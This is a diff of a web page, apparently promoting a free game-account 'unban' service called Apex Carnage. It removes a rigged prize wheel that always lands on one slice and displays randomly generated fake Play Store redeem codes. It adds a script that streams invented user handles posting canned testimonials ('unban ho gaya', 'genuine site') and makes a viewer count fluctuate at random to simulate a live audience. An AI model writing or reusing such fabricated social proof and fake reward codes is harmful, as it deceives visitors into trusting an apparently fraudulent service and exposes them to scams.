-    const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
-    let parts = [];
-    for (let p = 0; p < 4; p++) {
-      let str = "";
-      for (let i = 0; i < 4; i++) str += chars.charAt(Math.floor(Math.random() * chars.length));
-      parts.push(str);
-    }
-    return parts.join("-");
-  }
-
-  spinBtn.addEventListener("click", () => {
-    if (isSpinning || spinUserNameInput.value.trim().length < 2) return;
-
-    isSpinning = true;
-    spinBtn.disabled = true;
-    spinUserNameInput.disabled = true;
-    wheelResultBox.innerHTML = `<span style="color:#ffd700; font-size:14px; font-weight:700;">🌀 Spinning the lucky wheel...</span>`;
-
-    const targetSliceIndex = 0;
-    const sliceDeg = 360 / exactSlices.length;
-    const sliceCenter = targetSliceIndex * sliceDeg + (sliceDeg / 2);
-    
-    const targetOffset = 270 - sliceCenter;
-    const fullSpins = 6 * 360;
-    const finalAngle = currentAngle + fullSpins + (targetOffset - (currentAngle % 360));
-
-    currentAngle = finalAngle;
-    wheelCanvas.style.transform = `rotate(${finalAngle}deg)`;
-
-    setTimeout(() => {
-      isSpinning = false;
-      spinBtn.disabled = false;
-      spinUserNameInput.disabled = false;
-
-      const userName = spinUserNameInput.value.trim();
-      const code = generateFakeRedeemCode();
-
-      wheelResultBox.innerHTML = `
-        <div style="font-size:16px; font-weight:800; color:#ffd700; display:flex; align-items:center; gap:6px; margin-bottom:4px;">
-          <span>🎉</span> <span>WINNER!</span> <span>🪙</span>
-        </div>
-        <div style="color:#00ff87; font-size:13px; font-weight:700; margin-bottom:10px;">
-          Congratulations <b>${userName}</b>! You won <b>₹10 Play Store Redeem Code</b>!
-        </div>
-        <div style="background:#00e676; color:#000; font-weight:900; font-family:monospace; font-size:15px; letter-spacing:1.5px; padding:8px 20px; border-radius:8px; box-shadow:0 0 15px rgba(0,230,118,0.5);">
-          ${code}
-        </div>
-      `;
-    }, 5600);
-  });
-</script>
-
 <!-- FAQ LOGIC & CANVAS BACKGROUND -->
 <script>
   function toggleFaq(element) {
@@ -2038,6 +1910,148 @@ footer a { color: #ff4a4a; text-decoration: none; font-weight: bold; }
   }
   init();
   animate();
+</script>
+
+<!-- LIVE COMMENTS ENGINE -->
+<script>
+  const customUserList = [
+    "@zoyara._", "@ruhiix", "@mahiraxo", "@inayavibe", "@aaylinn._",
+    "@vianara", "@naylaxoxo", "@ishvii._", "@myravelle", "@aarnavi._",
+    "@zivanyaa", "@riavelle._", "@kiyara.xo", "@avishka._", "@suhana.vx",
+    "@elishaa._", "@navyelle", "@anvixoxo", "@yashvika._", "@aureliya.x",
+    "@mahira.vx", "@zunairaa._", "@vriyah._", "@nishvii", "@aaviyra",
+    "@raynixa", "@ishara._x", "@zyra.vibes", "@nyshika._", "@vihaara.x",
+    "@aryan.vibes", "@rohanxofficial", "@rahul._king", "@arjun.writes", "@adityaxvibes",
+    "@shivam.07", "@krishh._", "@amanxroy", "@dev._singh", "@yashraj.x",
+    "@rajput._boy", "@aaryan.verse", "@rudraxofficial", "@kunal._vibes", "@ansh._01",
+    "@harshxking", "@vivaan._x", "@ayush._roy", "@daksh.vibes", "@rishabh._x",
+    "@veer._singh", "@ishaanxvibe", "@manav._07", "@kabirxofficial", "@samar._verse",
+    "@devraj._x", "@atharv._boy", "@lakshya.vibes", "@raj._aesthetic", "@thearjun._"
+  ];
+
+  const cities = ["Kolkata", "Hyderabad", "Delhi", "Mumbai", "Nagpur", "Patna", "Lucknow", "Jaipur", "Bangalore", "Pune", "Indore", "Ranchi", "Howrah"];
+
+  const cityFormulas = [
+    (c) => `Apex bhai main aapka big fan hu ${c} se ❤️🙏`,
+    (c) => `Big fan from ${c} bro, keep helping us!`,
+    (c) => `bhai ${c} se hu, love your content 🔥`,
+    (c) => `Full support to Apex Carnage from ${c} 💥`,
+    (c) => `Huge fan from ${c} bhai! Free service OP 🙌`,
+    (c) => `Apex bhaii big fan ${c} se hu love you ❤`
+  ];
+
+  const unbanSuccessChats = [
+    "Bhai sach me unban ho gaya!! Love you apex ❤🔥",
+    "Thank you apex bhai mera unban ho gaya finally 😭🙏",
+    "ID login ho gayi bhai unban successful ⚡⚡",
+    "unban ho gaya bhai thanks a lot @apex.carnage.live",
+    "Mera account back aa gaya!! unban done 👍",
+    "5 min me unban ho gaya solid service!",
+    "unban successful bro thank you Apex bhai",
+    "Id unban ho gayi, thank you apex bhai 🔥",
+    "Thanks a lot bro sab kuch free me ho gaya ❤️",
+    "Aise hi help karte rehna bhai, unban done ho gaya mera!"
+  ];
+
+  const unbanRequests = [
+    "bhai mera bhi unban kar do please 🥺",
+    "apex bhai mera भी unban kar do UID check karo",
+    "bhai please mera id bhi kar do unban",
+    "mera bhi unban kar do bhai bhot din se suspended hai",
+    "bhai id unban kar do yaar, bhot pareshaan hu"
+  ];
+
+  const organicChannelChats = [
+    "nice bro keep it up",
+    "kaam kar raha hai genuine site",
+    "thanks bhai aise hi videos banate jaana",
+    "sabka help karte rehna bhai best ho aap",
+    "free me itna accha kaam koi nahi karta ❤️",
+    "working hai 100% genuine service",
+    "bhot sahi bhai great work!"
+  ];
+
+  const stream = document.getElementById('commentsStream');
+  let commentCounter = 0;
+  let userIndex = 0;
+
+  function pick(arr) {
+    return arr[Math.floor(Math.random() * arr.length)];
+  }
+
+  function getAvatarColor() {
+    const palette = ["#e11d48", "#2563eb", "#7c3aed", "#059669", "#d97706", "#dc2626", "#0891b2"];
+    return pick(palette);
+  }
+
+  function getNextCustomUser() {
+    const handle = customUserList[userIndex];
+    userIndex = (userIndex + 1) % customUserList.length;
+    const cleanLetter = handle.replace(/[@._]/g, '')[0] || 'A';
+    return {
+      name: handle,
+      initial: cleanLetter.toUpperCase()
+    };
+  }
+
+  function injectComment() {
+    commentCounter++;
+    const user = getNextCustomUser();
+    let textStr = "";
+    let styleClass = "";
+
+    if (commentCounter % 6 === 0) {
+      const city = pick(cities);
+      const formula = pick(cityFormulas);
+      textStr = formula(city);
+      styleClass = "city-shoutout";
+    } else {
+      const r = Math.random();
+      if (r < 0.52) {
+        textStr = pick(unbanSuccessChats);
+        styleClass = "unban-proof";
+      } else if (r < 0.78) {
+        textStr = pick(unbanRequests);
+        styleClass = "unban-req";
+      } else {
+        textStr = pick(organicChannelChats);
+        styleClass = "";
+      }
+    }
+
+    const item = document.createElement('div');
+    item.className = 'chat-item';
+    item.innerHTML = `
+      <div class="chat-avatar" style="background-color: ${getAvatarColor()}">${user.initial}</div>
+      <div class="chat-content">
+        <div class="chat-user-row">
+          <span class="chat-username">${user.name}</span>
+          <span class="chat-time">just now</span>
+        </div>
+        <div class="chat-text ${styleClass}">${textStr}</div>
+      </div>
+    `;
+
+    stream.appendChild(item);
+
+    if (stream.children.length > 5) {
+      stream.removeChild(stream.firstElementChild);
+    }
+
+    const wEl = document.getElementById('chatWatchers');
+    if (wEl) {
+      let cnt = parseInt(wEl.innerText.replace(/[^0-9]/g, ''));
+      cnt += Math.floor(Math.random() * 7) - 3;
+      wEl.innerText = `${cnt.toLocaleString()} watching`;
+    }
+
+    const nextInterval = Math.floor(Math.random() * 1800) + 1600;
+    setTimeout(injectComment, nextInterval);
+  }
+
+  for (let i = 0; i < 3; i++) {
+    injectComment();
+  }
 </script>
 </body>
 </html>
